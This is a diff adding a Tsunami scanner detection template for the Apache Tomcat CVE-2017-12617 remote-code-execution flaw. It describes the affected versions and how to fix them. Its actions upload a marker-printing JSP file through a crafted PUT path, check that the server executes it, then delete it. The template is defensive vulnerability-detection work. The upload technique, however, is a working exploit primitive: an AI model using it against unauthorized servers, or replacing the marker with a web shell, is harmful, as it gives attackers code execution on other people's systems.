@@ -1,0 +1,88 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "CVE-2017-12617 Detector"
+  author: "Leonardo Tamiano (leonardo.tamiano@mindedsecurity.com)"
+  version: "1.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "TSUNAMI_COMMUNITY"
+    value: "CVE_2017-12617"
+  }
+  severity: CRITICAL
+  title: "Apache Tomcat RCE CVE-2017-12617"
+  description: "Vulnerable Apache Tomcat versions (9.0.0.M1 to 9.0.0, 8.5.0 to 8.5.22, 8.0.0.RC1 to 8.0.46 and 7.0.0 to 7.0.81) containing a servlet context configured with readonly=false within the web.xml configuration, allow unauthenticated actors to upload arbitrary JSP files to the server via a specially crafted request. The uploaded JSP file could then be requested and any code it contained would be executed by the server, leading to Remote Code Execution (RCE)."
+  recommendation: "Upgrade to non-vulnerable versions of Apache Tomcat (>= 9.0.1, 8.5.23, 8.0.47, 7.0.82) and ensure that readonly is set to true for the default servlet, and for the webdav servlet. Block HTTP Methods that allow untrusted users to modify server's resources"
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2017-12617"
+  }
+}
+
+config: {}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "upload_jsp"
+  http_request: {
+    method: PUT
+    uri: "/tsunami_cve_2017_12617_{{ T_UTL_CURRENT_TIMESTAMP_MS }}.jsp/"
+    headers: [
+      { name: "Content-Type" value: "application/x-www-form-urlencoded" }
+    ]
+    data: "<% out.print(\"tsunami_cve_2017_12617_\" + 234567); %>"
+    response: {
+      http_status: 201
+    }
+  }
+  cleanup_actions: "cleanup_jsp"
+}
+
+actions: {
+  name: "verify_jsp"
+  http_request: {
+    method: GET
+    uri: "/tsunami_cve_2017_12617_{{ T_UTL_CURRENT_TIMESTAMP_MS }}.jsp"
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: "tsunami_cve_2017_12617_234567" }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "cleanup_jsp"
+  http_request: {
+    client_options: {
+      ignore_http_client_errors: true
+    }
+    method: DELETE
+    uri: "/tsunami_cve_2017_12617_{{ T_UTL_CURRENT_TIMESTAMP_MS }}.jsp/"
+  }
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "upload_jsp",
+    "verify_jsp"
+  ]
+}
